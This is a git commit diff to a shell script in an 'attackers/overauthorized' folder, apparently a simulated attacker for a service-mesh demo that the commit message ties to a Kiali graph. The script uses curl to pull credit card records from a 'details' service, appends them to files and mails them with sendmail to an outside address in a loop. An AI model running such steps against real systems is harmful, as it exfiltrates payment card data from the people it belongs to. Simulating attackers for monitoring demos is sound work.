3ff806633bb7e8ad968abef9faeb55635bd33221
Idan Midroni <idanmid15@gmail.com>
2019-02-06 16:32:27 +0200

    Changed the auth attacker to send constant emails and the credit cards only once(so the Kiali graph will keep updating)

--- attackers/overauthorized/restart_postfix.sh
+++ attackers/overauthorized/restart_postfix.sh
@@ -3,9 +3,15 @@
 service postfix restart
 sleep 10
 
+cat cards.txt >> allcards.txt
+curl http://details:${CARDSPORT}/details/372 >> allcards.txt
+sendmail ${DESTMAIL} < allcards.txt
 
-curl http://details:${CARDSPORT}/details/372 >> cards.txt
-sendmail blablablu@mailinator.com < cards.txt
-
-while true; do sleep 1000; done
+COUNTER=0
+while [[  ${COUNTER} -lt 10 ]]; do
+     sleep 5
+     curl http://details:${CARDSPORT}/details/0
+     sleep 1
+     sendmail ${DESTMAIL} < cards.txt
+done
 
